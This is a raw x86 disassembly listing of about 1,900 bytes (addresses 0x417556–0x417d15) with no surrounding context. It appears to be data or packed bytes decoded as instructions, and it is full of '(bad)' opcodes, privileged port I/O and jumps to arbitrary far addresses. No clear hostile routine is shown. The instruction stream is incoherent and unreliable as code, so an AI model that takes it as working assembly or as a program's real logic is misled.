  417556:	pushf  
  417557:	frstor [ebx-0x75a1578f]
  41755d:	ret    
  41755e:	into   
  41755f:	les    ebp,FWORD PTR [esi+0x45]
  417562:	push   ss
  417563:	fadd   st,st(3)
  417565:	xor    BYTE PTR [ebx+0x4a],0x95
  417569:	adc    eax,0x43081e78
  41756e:	fadd   st,st(3)
  417570:	mul    esp
  417572:	xchg   edi,eax
  417573:	xchg   edx,eax
  417574:	add    eax,0xeb7abdb5
  417579:	str    WORD PTR [ebx]
  41757c:	aas    
  41757d:	mov    edi,0x43247604
  417582:	mov    DWORD PTR [edi],edx
  417584:	shl    DWORD PTR [eax+0x3a0340ce],1
  41758a:	dec    eax
  41758b:	mov    al,0xcc
  41758d:	mov    al,ds:0x84e2248
  417592:	or     ecx,0xffffffb3
  417595:	ins    BYTE PTR es:[edi],dx
  417596:	jl     0x41760f
  417598:	inc    esp
  417599:	mov    eax,ds:0x10499007
  41759e:	sbb    dh,0x76
  4175a1:	das    
  4175a2:	pop    ecx
  4175a3:	jo     0x4175d5
  4175a5:	cmc    
  4175a6:	and    ebp,DWORD PTR ds:0x5b6f670d
  4175ac:	jb     0x41753b
  4175ae:	jmp    0x1e0b:0xaf648726
  4175b5:	stc    
  4175b6:	les    ebp,FWORD PTR [edi]
  4175b8:	push   eax
  4175b9:	jnp    0x417619
  4175bb:	pop    esi
  4175bc:	push   eax
  4175bd:	mov    ebp,0xd786a925
  4175c2:	cld    
  4175c3:	jmp    0x7bd3acba
  4175c8:	out    dx,al
  4175c9:	fild   WORD PTR ds:0x8a93276d
  4175cf:	inc    ebp
  4175d0:	out    0xdc,al
  4175d2:	or     al,0x26
  4175d4:	outs   dx,BYTE PTR ds:[esi]
  4175d5:	fwait
  4175d6:	mov    ebx,0x38804531
  4175db:	pop    edx
  4175dc:	dec    edx
  4175dd:	mov    edx,0xd4f4b126
  4175e2:	fild   WORD PTR [edx]
  4175e4:	int3   
  4175e5:	out    dx,eax
  4175e6:	cmc    
  4175e7:	mov    ebx,0xfb485292
  4175ec:	cdq    
  4175ed:	cmp    bl,BYTE PTR [eax]
  4175ef:	jg     0x417601
  4175f1:	call   0x4c00:0x6e58a66
  4175f8:	or     al,BYTE PTR [esi+0x15]
  4175fb:	mov    ah,0xf7
  4175fd:	sbb    ch,ah
  4175ff:	aas    
  417600:	cs sbb ebp,esi
  417603:	cld    
  417604:	pop    edx
  417605:	inc    edx
  417606:	clc    
  417607:	pop    ebp
  417608:	jae    0x417687
  41760a:	setnp  BYTE PTR [edx+eax*4-0x3e]
  41760f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417610:	cdq    
  417611:	xor    esp,edx
  417613:	add    DWORD PTR [edx],esp
  417615:	xchg   ecx,eax
  417616:	mov    dh,BYTE PTR [ecx+0x7d15d403]
  41761c:	and    dl,bh
  41761e:	iret   
  41761f:	das    
  417620:	gs mov edx,0xc99e5ea1
  417626:	xor    BYTE PTR [ebx+0x64bea805],ah
  41762c:	scas   al,BYTE PTR es:[edi]
  41762d:	inc    eax
  41762e:	cmp    esp,DWORD PTR [edi-0x68]
  417631:	xor    ebp,DWORD PTR [ecx+esi*8+0x4750fb1c]
  417638:	xor    eax,0x4527c585
  41763d:	jmp    0x41762c
  41763f:	mov    ch,0xdf
  417641:	and    eax,0x59e5d5fa
  417646:	gs cmp al,0x8
  417649:	push   esi
  41764a:	pop    esi
  41764b:	out    dx,al
  41764c:	mov    cl,0x30
  41764e:	loope  0x41767e
  417650:	xlat   BYTE PTR ds:[ebx]
  417651:	fs add eax,0xb73ca028
  417657:	popf   
  417658:	addr16 stc 
  41765a:	mov    bh,BYTE PTR [esi+0x1b]
  41765d:	push   eax
  41765e:	mov    ah,0x1a
  417660:	icebp  
  417661:	inc    ebx
  417662:	and    DWORD PTR [eax+ecx*8+0x752060e6],edi
  417669:	mov    al,0x1b
  41766b:	(bad)  
  41766d:	jno    0x417648
  41766f:	adc    ch,BYTE PTR [edx+0x108510eb]
  417675:	sbb    bl,BYTE PTR [ecx-0x7]
  417678:	pop    eax
  417679:	or     dh,BYTE PTR [edi]
  41767b:	test   al,0x85
  41767d:	mov    esp,0x54d65514
  417682:	ins    DWORD PTR es:[edi],dx
  417683:	mov    ah,0xe6
  417685:	call   FWORD PTR [ebx]
  417687:	sbb    dh,dh
  417689:	mov    dl,0xcc
  41768b:	and    eax,0xfd12f112
  417690:	mov    dl,0x9e
  417692:	popf   
  417693:	dec    cl
  417695:	pop    ebx
  417696:	push   es
  417697:	pop    eax
  417698:	sub    BYTE PTR [eax-0x6fa9d84e],dh
  41769e:	stos   DWORD PTR es:[edi],eax
  41769f:	aas    
  4176a0:	out    dx,al
  4176a1:	push   edi
  4176a2:	xor    bh,bh
  4176a4:	push   0x19
  4176a6:	in     al,0x15
  4176a8:	mov    bh,0xf0
  4176aa:	pop    es
  4176ab:	out    0x41,al
  4176ad:	xchg   edx,eax
  4176ae:	inc    ecx
  4176af:	dec    ecx
  4176b0:	ret    
  4176b1:	loopne 0x41763d
  4176b3:	(bad)  [ebx-0x2b]
  4176b6:	cdq    
  4176b7:	jae    0x417672
  4176b9:	inc    edi
  4176ba:	jmp    0x4971:0x3dd0dece
  4176c1:	(bad)
  4176c5:	xchg   esp,eax
  4176c6:	xlat   BYTE PTR ds:[ebx]
  4176c7:	push   0x6e39c163
  4176cc:	add    eax,0x6d5c0bb
  4176d1:	jle    0x4176fa
  4176d3:	pop    edx
  4176d4:	je     0x4176b3
  4176d6:	jmp    0x417725
  4176d8:	(bad)  
  4176d9:	(bad)  
  4176db:	and    bl,bl
  4176dd:	mov    eax,ds:0x21e4ab15
  4176e2:	mov    BYTE PTR [ebp-0x36f90703],al
  4176e8:	dec    edi
  4176e9:	fiadd  WORD PTR [eax+ebx*2+0x7827e89a]
  4176f0:	ficom  WORD PTR [ebp-0x26d14fac]
  4176f6:	sbb    ebx,ebp
  4176f8:	int    0x4f
  4176fa:	mov    dh,ch
  4176fc:	pop    ds
  4176fd:	mov    dl,0xe5
  4176ff:	inc    esp
  417700:	std    
  417701:	mov    WORD PTR [edx],ss
  417703:	dec    ebp
  417704:	jno    0x417711
  417706:	repnz shl BYTE PTR [esp+ecx*1+0x33],cl
  41770b:	gs call 0x5e8dece
  417711:	xor    bh,ch
  417713:	xchg   edx,eax
  417714:	ret    0xaac9
  417717:	jl     0x41776b
  417719:	loop   0x417731
  41771b:	add    al,dl
  41771d:	jp     0x41771e
  41771f:	push   ecx
  417720:	inc    esp
  417721:	pushf  
  417722:	mov    esp,0x324c7184
  417727:	ficomp DWORD PTR [ebx+edi*4+0x3ec89c1f]
  41772e:	fimul  DWORD PTR [esi]
  417730:	mov    WORD PTR [esi+0x676ec3e1],fs
  417736:	jbe    0x417757
  417738:	xchg   BYTE PTR [eax-0x6d],bh
  41773b:	(bad)  
  41773c:	lock in eax,0x59
  41773f:	mov    ebp,0xda71c3a1
  417744:	and    ebx,DWORD PTR [ebp+0x18]
  417747:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417748:	(bad)  
  417749:	outs   dx,DWORD PTR ds:[esi]
  41774a:	pop    ebx
  41774b:	addr16 nop
  41774d:	xchg   esp,eax
  41774e:	push   0xffffffeb
  417750:	(bad)  
  417752:	and    ebx,DWORD PTR [edx+0x7e03b759]
  417758:	sub    al,0x8d
  41775a:	push   eax
  41775b:	jl     0x417754
  41775d:	shr    BYTE PTR [esi],cl
  41775f:	mov    DWORD PTR [edi+0x23431020],esp
  417765:	xor    edi,ecx
  417767:	test   eax,0x8def3365
  41776c:	ins    BYTE PTR es:[edi],dx
  41776d:	inc    ecx
  41776e:	sbb    DWORD PTR [edi-0x11ecbd25],esp
  417774:	or     eax,ebp
  417776:	and    al,0x55
  417778:	fiadd  WORD PTR [edi]
  41777a:	lock cwde 
  41777c:	pop    eax
  41777d:	sub    eax,0xba057334
  417782:	jno    0x41774b
  417784:	mov    esp,0x8060c057
  417789:	xchg   edx,eax
  41778a:	loope  0x417741
  41778c:	add    DWORD PTR [ecx+0x16],0xffffffbc
  417790:	jl     0x4177c5
  417792:	bound  ecx,QWORD PTR [esi-0x2f]
  417795:	rcl    cl,cl
  417797:	mov    eax,?
  417799:	mov    al,0x96
  41779b:	jecxz  0x41779a
  41779d:	inc    esp
  41779e:	push   edx
  41779f:	mov    esi,0x2352886b
  4177a4:	aaa    
  4177a5:	add    eax,DWORD PTR [ebx]
  4177a7:	jge    0x4177d2
  4177a9:	daa    
  4177aa:	cwde   
  4177ab:	(bad)  
  4177ac:	out    dx,al
  4177ad:	fisttp WORD PTR [ecx+0x6474d287]
  4177b3:	sbb    eax,0xb2ae6704
  4177b8:	test   BYTE PTR [edi-0x4471f2d8],ah
  4177be:	jp     0x417823
  4177c0:	rcr    BYTE PTR [ecx-0x23c4a2e0],0x44
  4177c7:	sti    
  4177c8:	jmp    0xc42ff9e9
  4177cd:	pop    eax
  4177ce:	mov    cl,BYTE PTR [edx-0x6011ead]
  4177d4:	xchg   ebx,eax
  4177d5:	dec    ebx
  4177d6:	mov    ds:0x38e27284,al
  4177db:	retf   
  4177dc:	pop    edx
  4177dd:	stos   BYTE PTR es:[edi],al
  4177de:	push   eax
  4177df:	push   esi
  4177e0:	add    esp,eax
  4177e2:	xlat   BYTE PTR ds:[ebx]
  4177e3:	sar    DWORD PTR [eax-0x531eba34],0xeb
  4177ea:	mov    ch,0x79
  4177ec:	push   0x2dff4912
  4177f1:	cwde   
  4177f2:	sti    
  4177f3:	and    edi,DWORD PTR [ebp+0x1e]
  4177f6:	popf   
  4177f7:	jmp    0x3fca9164
  4177fc:	cld    
  4177fd:	sub    al,0xcd
  4177ff:	mov    al,ds:0x80364afe
  417804:	xor    eax,0x603c098f
  417809:	sub    bh,bl
  41780b:	jmp    0x417854
  41780d:	sbb    ebx,DWORD PTR [ebp+0x26ebe9ae]
  417813:	fs ins BYTE PTR es:[edi],dx
  417815:	push   esi
  417816:	dec    ebx
  417817:	xor    BYTE PTR [edx+esi*1],0xf4
  41781b:	out    0x9a,eax
  41781d:	ins    BYTE PTR es:[edi],dx
  41781e:	adc    ebx,edi
  417820:	nop
  417821:	in     al,dx
  417822:	xchg   ebx,eax
  417823:	push   ebp
  417824:	sar    BYTE PTR [esi],1
  417826:	mov    bl,0x6c
  417828:	sbb    edi,ebx
  41782a:	pusha  
  41782b:	call   0x7ec5:0xe4c50eef
  417832:	jnp    0x41787b
  417834:	retf   0x42e6
  417837:	or     edx,DWORD PTR [ebx]
  417839:	adc    al,0xd0
  41783b:	add    ebp,DWORD PTR [eax-0xe0bad1f]
  417841:	push   esp
  417842:	add    BYTE PTR [eax],cl
  417844:	dec    edx
  417845:	pop    ebp
  417846:	inc    edi
  417847:	sbb    al,0x65
  417849:	(bad)  
  41784a:	fwait
  41784b:	popa   
  41784c:	ins    DWORD PTR es:[edi],dx
  41784d:	and    dh,ah
  41784f:	or     BYTE PTR [ebx-0x77],dh
  417852:	add    al,0x0
  417854:	pop    esp
  417855:	pop    edi
  417856:	ret    0xcbd1
  417859:	mov    BYTE PTR [edi+0x65],al
  41785c:	pop    ebp
  41785d:	cmp    al,0x8f
  41785f:	cmp    esi,DWORD PTR [ebp+0x3eb96dc1]
  417865:	inc    ebp
  417866:	sbb    bl,cl
  417868:	jo     0x4178a9
  41786a:	xchg   edx,eax
  41786b:	pop    edi
  41786c:	ins    DWORD PTR es:[edi],dx
  41786d:	xchg   ebp,eax
  41786e:	xchg   edx,eax
  41786f:	das    
  417870:	daa    
  417871:	dec    ebx
  417872:	loop   0x4177f7
  417874:	dec    esp
  417875:	sub    ch,dh
  417877:	sbb    dl,BYTE PTR [ebx]
  417879:	mov    ebx,0x8fdb7558
  41787e:	push   0xf506e3c9
  417883:	dec    ebx
  417884:	lods   eax,DWORD PTR ds:[esi]
  417885:	fdivr  DWORD PTR [ecx+0x23]
  417888:	pmullw mm6,QWORD PTR [edx+0xf]
  41788c:	add    edx,esp
  41788e:	int3   
  41788f:	pop    esp
  417890:	icebp  
  417891:	aad    0xf5
  417893:	scas   eax,DWORD PTR es:[edi]
  417894:	or     DWORD PTR [ebx+0x41ac4264],edi
  41789a:	test   eax,0xed6226cd
  41789f:	mov    ebx,0xa1f5e254
  4178a4:	jne    0x417882
  4178a6:	jl     0x41783d
  4178a8:	or     eax,0x900463d6
  4178ad:	jbe    0x417869
  4178af:	push   ecx
  4178b0:	aas    
  4178b1:	or     esp,edi
  4178b3:	cs retf 0x392d
  4178b7:	cmp    DWORD PTR gs:[ecx-0x30],ebp
  4178bb:	das    
  4178bc:	(bad)  
  4178bd:	(bad)  
  4178be:	jmp    0xb5e1:0x4ab53123
  4178c5:	loopne 0x4178b7
  4178c7:	sbb    BYTE PTR [edx],ah
  4178c9:	add    edx,ecx
  4178cb:	mov    edx,0x2b167567
  4178d0:	ret    
  4178d1:	mov    DWORD PTR [ebx-0x2ad2114e],0x6cc3bd95
  4178db:	cmp    eax,0x1a2d67ea
  4178e0:	xchg   esi,eax
  4178e1:	cmp    al,0x57
  4178e3:	pop    esp
  4178e4:	sbb    eax,0x9454f281
  4178e9:	in     al,0xe6
  4178eb:	mov    esi,0xefc63425
  4178f0:	add    BYTE PTR [ecx+0x517c3e76],0xe3
  4178f7:	rcl    BYTE PTR [ebp-0x1233b44a],1
  4178fd:	inc    ebp
  4178fe:	mov    ?,WORD PTR [ebx]
  417900:	push   ds
  417901:	mov    ebp,0x1c9b4e34
  417906:	gs ins BYTE PTR es:[edi],dx
  417908:	push   0x6e
  41790a:	xchg   BYTE PTR [ebp+0x673bfbb1],ch
  417910:	push   esp
  417911:	mov    cl,0x2b
  417913:	and    esp,DWORD PTR ds:[esi+0x289d04b4]
  41791a:	ficomp DWORD PTR [ecx]
  41791c:	push   esp
  41791d:	push   ebp
  41791e:	push   ebx
  41791f:	ds mov ah,0xd0
  417922:	dec    ebx
  417923:	test   al,0xf3
  417925:	out    dx,eax
  417926:	in     al,0x1f
  417928:	mov    ebp,0xc03868ed
  41792d:	loope  0x417932
  41792f:	sbb    ebx,edi
  417931:	cmp    al,0x9f
  417933:	(bad)  
  417934:	call   0xd19c:0x68b70b8a
  41793b:	outs   dx,BYTE PTR ds:[esi]
  41793c:	mov    DWORD PTR [eax-0x70],ecx
  41793f:	cmc    
  417940:	dec    esi
  417941:	or     DWORD PTR [ecx-0x25c9ef44],esi
  417947:	stos   BYTE PTR es:[edi],al
  417948:	test   DWORD PTR [eax],esi
  41794a:	lods   al,BYTE PTR ds:[esi]
  41794b:	je     0x4179af
  41794d:	inc    edx
  41794e:	fnstenv [ebp-0x45]
  417951:	sub    bl,BYTE PTR [edi]
  417953:	lahf   
  417954:	addr16 jno 0x4179b0
  417957:	xchg   esp,eax
  417958:	pusha  
  417959:	popf   
  41795a:	xchg   ebp,eax
  41795b:	push   ss
  41795c:	in     al,dx
  41795d:	and    eax,DWORD PTR [ebx-0x21]
  417960:	mov    esi,0xb11961b3
  417965:	das    
  417966:	push   ss
  417967:	mov    al,0x63
  417969:	gs mov esp,0x31961097
  41796f:	mov    ds:0x846a0066,al
  417974:	ret    0xb0a1
  417977:	pop    ebp
  417978:	mov    ch,0x49
  41797a:	aas    
  41797b:	call   0x7f19:0xd8aff5ca
  417982:	xchg   ebx,eax
  417983:	jecxz  0x4179d4
  417985:	dec    edx
  417986:	pushf  
  417987:	cmc    
  417988:	call   0x12330ae9
  41798d:	test   eax,0xbaee6101
  417992:	mov    ebp,0x84e8c75f
  417997:	pop    ebx
  417998:	dec    edx
  417999:	cmp    eax,0xf9bfeaef
  41799e:	dec    esi
  41799f:	push   es
  4179a0:	sub    BYTE PTR [ecx],ah
  4179a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179a3:	pop    ds
  4179a4:	into   
  4179a5:	or     BYTE PTR [edi],ch
  4179a7:	stos   BYTE PTR es:[edi],al
  4179a8:	xor    eax,0x716dbffb
  4179ad:	(bad)  
  4179ae:	ins    DWORD PTR es:[edi],dx
  4179af:	sbb    DWORD PTR [eax-0x4a],eax
  4179b2:	and    al,cl
  4179b4:	pop    eax
  4179b5:	mov    al,0xe4
  4179b7:	cmp    al,0x4c
  4179b9:	not    DWORD PTR [edi]
  4179bb:	mov    ?,WORD PTR [ebx-0xac1b55e]
  4179c1:	push   edi
  4179c2:	xor    esp,DWORD PTR [ecx-0x75ac818]
  4179c8:	or     BYTE PTR [eax-0x21],dl
  4179cb:	and    esi,ebx
  4179cd:	fdivr  QWORD PTR [eax-0x2fe145e2]
  4179d3:	mov    bl,BYTE PTR [ebx+0x1d2390dd]
  4179d9:	and    DWORD PTR [ecx+0x1],esi
  4179dc:	cmc    
  4179dd:	push   es
  4179de:	jmp    0x8d853a09
  4179e3:	jo     0x417a39
  4179e5:	add    al,0x91
  4179e7:	test   ch,cl
  4179e9:	jo     0x4179db
  4179eb:	adc    BYTE PTR [esi+0xa],ah
  4179ee:	sub    dl,BYTE PTR [esi-0x7421c40]
  4179f4:	outs   dx,BYTE PTR ds:[esi]
  4179f5:	and    esi,DWORD PTR [ecx-0x3b]
  4179f8:	or     eax,DWORD PTR [edi+0x16]
  4179fb:	scas   eax,DWORD PTR es:[edi]
  4179fc:	mov    bh,0x70
  4179fe:	dec    edx
  4179ff:	enter  0xd850,0x17
  417a03:	push   edi
  417a04:	ins    DWORD PTR es:[edi],dx
  417a05:	ja     0x417a24
  417a07:	(bad)  
  417a08:	fisttp QWORD PTR [eax+0x71]
  417a0b:	pop    ebp
  417a0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a0d:	cwde   
  417a0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a0f:	(bad)  
  417a10:	sub    BYTE PTR es:[ebx+eiz*2-0x1a141a77],cl
  417a18:	sbb    edi,DWORD PTR [ebx+eiz*4]
  417a1b:	mov    gs,WORD PTR [edx+0x509b567c]
  417a21:	fst    QWORD PTR [ebp+0x6753d551]
  417a27:	inc    esp
  417a28:	xor    eax,0x18809be7
  417a2d:	dec    esi
  417a2e:	fdiv   DWORD PTR [ebp+0x70]
  417a31:	fs jbe 0x417a7a
  417a34:	jbe    0x417a22
  417a36:	and    eax,0x2b3577bc
  417a3b:	jp     0x417a1d
  417a3d:	pop    esi
  417a3e:	cs inc edi
  417a40:	mov    dl,cl
  417a42:	fst    QWORD PTR [esi]
  417a44:	dec    ebx
  417a45:	inc    ecx
  417a46:	aad    0xf2
  417a48:	mov    dl,0x91
  417a4a:	test   eax,0x3aa6fc16
  417a4f:	mov    ebx,0x9bfedb82
  417a54:	sti    
  417a55:	jmp    0x4f6f:0x3edee31f
  417a5c:	add    DWORD PTR [esi+0x28],edx
  417a5f:	cmp    al,dl
  417a61:	inc    ebp
  417a62:	test   dl,0xbf
  417a65:	inc    esi
  417a66:	cdq    
  417a67:	jne    0x417aa6
  417a69:	push   ebp
  417a6a:	mov    ah,0x20
  417a6c:	out    dx,al
  417a6d:	mov    dh,0x37
  417a6f:	push   0x5486f787
  417a74:	imul   eax,eax,0x3f
  417a77:	repnz dec esi
  417a79:	xor    DWORD PTR [edi+ecx*4+0x26],edi
  417a7d:	js     0x417ab4
  417a7f:	imul   edx,DWORD PTR [ebp+ecx*1+0x6dbe08c7],0xe156e7f8
  417a8a:	push   esi
  417a8b:	cwde   
  417a8c:	dec    esp
  417a8d:	(bad)  [edi]
  417a8f:	jne    0x417ae9
  417a91:	xchg   edi,edx
  417a93:	cvtdq2ps xmm0,XMMWORD PTR [ecx+0x70]
  417a97:	mov    cl,0xa2
  417a99:	iret   
  417a9a:	mov    ch,0x10
  417a9c:	xchg   esp,eax
  417a9d:	dec    ebp
  417a9e:	xchg   ebp,eax
  417a9f:	xor    DWORD PTR [ecx-0x17b446a5],0x4c
  417aa6:	dec    edx
  417aa7:	aad    0xdf
  417aa9:	std    
  417aaa:	shr    BYTE PTR [edi+0x7a],0x42
  417aae:	pop    ecx
  417aaf:	pusha  
  417ab0:	fbstp  TBYTE PTR [edi]
  417ab2:	inc    ebx
  417ab3:	addr16 arpl sp,di
  417ab6:	jecxz  0x417b25
  417ab8:	xchg   ebp,eax
  417ab9:	xchg   BYTE PTR [ecx],dl
  417abb:	aaa    
  417abc:	mov    ch,0x71
  417abe:	mov    ecx,0x1769f3d4
  417ac3:	(bad)  
  417ac4:	cs xchg ebp,eax
  417ac6:	scas   al,BYTE PTR es:[edi]
  417ac7:	rcr    edx,1
  417ac9:	mov    bh,0x74
  417acb:	pusha  
  417acc:	aam    0xa2
  417ace:	jo     0x417b3f
  417ad0:	jle    0x417a60
  417ad2:	ja     0x417afd
  417ad4:	test   al,0x6a
  417ad6:	mov    ah,0x3e
  417ad8:	cwde   
  417ad9:	inc    edi
  417ada:	dec    esp
  417adb:	in     al,dx
  417adc:	shl    BYTE PTR [ebx-0x4163e503],cl
  417ae2:	js     0x417b3f
  417ae4:	icebp  
  417ae5:	mov    eax,ds:0xef94dd37
  417aea:	sbb    eax,0xd2fd515e
  417aef:	(bad)  [edi-0x7f]
  417af2:	mov    cl,0x21
  417af4:	test   BYTE PTR [eax-0x719145a5],bh
  417afa:	icebp  
  417afb:	xchg   DWORD PTR ds:0xcadce194,edi
  417b01:	ss pusha 
  417b03:	fiadd  DWORD PTR [eax-0xc]
  417b06:	adc    edi,DWORD PTR [ecx]
  417b08:	pop    ebx
  417b09:	dec    edx
  417b0a:	sahf   
  417b0b:	shl    DWORD PTR [edx],cl
  417b0d:	into   
  417b0e:	std    
  417b0f:	popa   
  417b10:	pop    edx
  417b11:	in     eax,0x90
  417b13:	(bad)  
  417b14:	adc    eax,0xf260ff93
  417b19:	add    eax,0x9066329f
  417b1e:	push   esi
  417b1f:	xchg   ebx,eax
  417b20:	mov    esp,0xa537f00a
  417b25:	adc    BYTE PTR [edi+0x5ede36f7],ch
  417b2b:	and    ecx,DWORD PTR [eax]
  417b2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b2f:	outs   dx,BYTE PTR ds:[esi]
  417b30:	fld    TBYTE PTR [ebx-0x17]
  417b33:	and    edi,DWORD PTR [edx-0x333c5b30]
  417b39:	xchg   esi,eax
  417b3a:	sbb    BYTE PTR cs:[eax+0x35],bh
  417b3e:	(bad)  
  417b3f:	fimul  WORD PTR [edx]
  417b41:	push   esp
  417b42:	out    dx,eax
  417b43:	add    bh,al
  417b45:	repnz clc 
  417b47:	sub    ebp,DWORD PTR [edi+0x29d050d3]
  417b4d:	push   ebx
  417b4e:	pushf  
  417b4f:	imul   ebp,edx,0x94723968
  417b55:	cmc    
  417b56:	mov    ds,WORD PTR [ebx+0x69]
  417b59:	sar    BYTE PTR [ebp+0x1530f791],cl
  417b5f:	inc    esp
  417b60:	xchg   ebp,eax
  417b61:	or     eax,0xdd06a3a2
  417b66:	call   0xc5eb:0xfa5fd008
  417b6d:	xchg   BYTE PTR [edx],dl
  417b6f:	sbb    eax,DWORD PTR [ebp+0x70]
  417b72:	in     eax,0x9c
  417b74:	xchg   ebp,eax
  417b75:	sar    esi,cl
  417b77:	ret    0xb256
  417b7a:	mov    edi,0x3ba755e
  417b7f:	pop    ebp
  417b80:	ins    BYTE PTR es:[edi],dx
  417b81:	test   BYTE PTR [edi-0x467e362a],bh
  417b87:	jl     0x417b98
  417b89:	int    0x2b
  417b8b:	iret   
  417b8c:	loopne 0x417b9a
  417b8e:	mov    dl,0x89
  417b90:	or     bh,dh
  417b92:	mov    bh,BYTE PTR [ebx-0x35]
  417b95:	arpl   WORD PTR [ebx],di
  417b97:	pop    ebp
  417b98:	das    
  417b99:	jmp    0x417bda
  417b9b:	ror    BYTE PTR [ebp-0x3c4f29e2],cl
  417ba1:	and    ebx,DWORD PTR [ebx]
  417ba3:	out    dx,eax
  417ba4:	(bad)  
  417ba5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ba6:	jae    0x417ba8
  417ba8:	cmp    DWORD PTR ds:0xdd4afc54,ebp
  417bae:	jo     0x417bda
  417bb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bb1:	js     0x417bac
  417bb3:	cli    
  417bb4:	sbb    al,BYTE PTR [eax-0x29]
  417bb7:	sahf   
  417bb8:	or     BYTE PTR [edx+0x655d4400],bl
  417bbe:	iret   
  417bbf:	xchg   edi,eax
  417bc0:	dec    edi
  417bc1:	mov    ds:0x7fa8149a,al
  417bc6:	cmp    DWORD PTR [eax+0x4f],ebp
  417bc9:	pop    esp
  417bca:	push   0xc
  417bcc:	push   es
  417bcd:	ds popa 
  417bcf:	cmc    
  417bd0:	inc    esi
  417bd1:	into   
  417bd2:	xor    ebx,DWORD PTR [esi-0x5c]
  417bd5:	sub    BYTE PTR [esi],cl
  417bd7:	mov    ah,bl
  417bd9:	lods   al,BYTE PTR ds:[esi]
  417bda:	in     al,0xf8
  417bdc:	pop    eax
  417bdd:	pushf  
  417bde:	sar    DWORD PTR [ebx+0x19],1
  417be1:	or     ebx,DWORD PTR [ecx-0x47b7c09d]
  417be7:	neg    DWORD PTR ds:0xe9aae612
  417bed:	sub    al,0x47
  417bef:	dec    edi
  417bf0:	dec    esp
  417bf1:	pop    esi
  417bf2:	test   BYTE PTR ds:0x5e2581ea,ah
  417bf8:	sbb    eax,0xa08442c1
  417bfd:	aaa    
  417bfe:	lods   al,BYTE PTR ds:[esi]
  417bff:	bound  edi,QWORD PTR ds:0x9b180b25
  417c05:	rol    BYTE PTR [ecx-0x8],0x18
  417c09:	ins    BYTE PTR es:[edi],dx
  417c0a:	dec    BYTE PTR [edi-0x5]
  417c0d:	std    
  417c0e:	pop    esi
  417c0f:	cli    
  417c10:	test   al,0x68
  417c12:	mov    bh,0xc3
  417c14:	jnp    0x417c19
  417c16:	js     0x417c5e
  417c18:	scas   eax,DWORD PTR es:[edi]
  417c19:	push   0x11
  417c1b:	jle    0x417c10
  417c1d:	or     cl,0x18
  417c20:	ins    WORD PTR es:[edi],dx
  417c22:	in     eax,dx
  417c23:	clc    
  417c24:	mov    dl,0x85
  417c26:	adc    BYTE PTR [edx+0x27c7c5e6],ch
  417c2c:	cdq    
  417c2d:	div    BYTE PTR [edx+0x44]
  417c30:	jnp    0x417c60
  417c32:	rol    DWORD PTR [edi],0x9f
  417c35:	and    BYTE PTR [ebp+0x43],bh
  417c38:	jecxz  0x417c63
  417c3a:	xlat   BYTE PTR ds:[ebx]
  417c3b:	arpl   di,dx
  417c3d:	clc    
  417c3e:	xchg   esi,eax
  417c3f:	sub    eax,0x39b8ff
  417c44:	push   esp
  417c45:	mov    esi,0x2f03acd2
  417c4a:	inc    ecx
  417c4b:	in     al,0xe2
  417c4d:	cwde   
  417c4e:	xlat   BYTE PTR ds:[ebx]
  417c4f:	push   edi
  417c50:	xor    BYTE PTR [esi+0x13],bh
  417c53:	repz jae 0x417c03
  417c56:	lock xor al,0x9c
  417c59:	adc    ah,cl
  417c5b:	lods   eax,DWORD PTR ds:[esi]
  417c5c:	mov    ebp,0x38af82c5
  417c61:	inc    esi
  417c62:	aam    0xf3
  417c64:	lea    edi,[ebx+esi*4-0x14bc4110]
  417c6b:	and    DWORD PTR [edi+0x79],ebx
  417c6e:	mov    ds:0x127dc5c1,eax
  417c73:	mov    DWORD PTR [ecx+eax*1-0x4ac42119],esi
  417c7a:	ins    DWORD PTR es:[edi],dx
  417c7b:	adc    al,0x9
  417c7d:	jne    0x417ccc
  417c7f:	retf   0xd763
  417c82:	lsl    ebp,WORD PTR [ecx+ebp*2-0x72]
  417c87:	enter  0xb0ee,0x23
  417c8b:	sahf   
  417c8c:	push   es
  417c8d:	retf   
  417c8e:	jb     0x417c26
  417c90:	push   es
  417c91:	inc    edx
  417c92:	aad    0x64
  417c94:	out    0xd0,al
  417c96:	les    edx,FWORD PTR ds:0x7f4e1675
  417c9c:	in     al,0x8
  417c9e:	xchg   ebx,eax
  417c9f:	call   0x46135fa4
  417ca4:	sti    
  417ca5:	xchg   ebp,eax
  417ca6:	aaa    
  417ca7:	icebp  
  417ca8:	test   al,0xe6
  417caa:	out    dx,al
  417cab:	ds in  eax,0x7d
  417cae:	push   ebp
  417caf:	adc    BYTE PTR [ecx-0xf02d267],ch
  417cb5:	mov    db5,ebp
  417cb8:	jmp    0x177d:0xd51530ad
  417cbf:	or     cl,bl
  417cc1:	nop
  417cc2:	sbb    bh,0x88
  417cc5:	mov    eax,0xf7a15b8b
  417cca:	nop
  417ccb:	and    eax,DWORD PTR [edi]
  417ccd:	out    dx,al
  417cce:	das    
  417ccf:	jmp    0xdddb817c
  417cd4:	inc    ecx
  417cd5:	push   edx
  417cd6:	pushf  
  417cd7:	ins    BYTE PTR es:[edi],dx
  417cd8:	and    BYTE PTR [edx],dh
  417cda:	mov    ebx,DWORD PTR ds:0xb4229ba
  417ce0:	xor    bh,dl
  417ce2:	xchg   edx,eax
  417ce3:	mov    esi,DWORD PTR [eax+0x20]
  417ce6:	mov    edi,0x94c5708c
  417ceb:	pop    es
  417cec:	int3   
  417ced:	xor    BYTE PTR [edx-0x18],ah
  417cf0:	xor    BYTE PTR [esi+0x1ea52546],bh
  417cf6:	aad    0x2e
  417cf8:	loop   0x417d55
  417cfa:	(bad)  
  417cfc:	loopne 0x417cb8
  417cfe:	cmp    DWORD PTR [ebp-0x13ffeaeb],ebp
  417d04:	dec    eax
  417d05:	mov    dl,0x98
  417d07:	ins    BYTE PTR es:[edi],dx
  417d08:	jp     0x417d6c
  417d0a:	or     BYTE PTR [ebx],ah
  417d0c:	ror    bh,1
  417d0e:	ret    0x2386
  417d11:	jp     0x417d1e
  417d13:	sub    esp,eax
  417d15:	and    al,0xa0
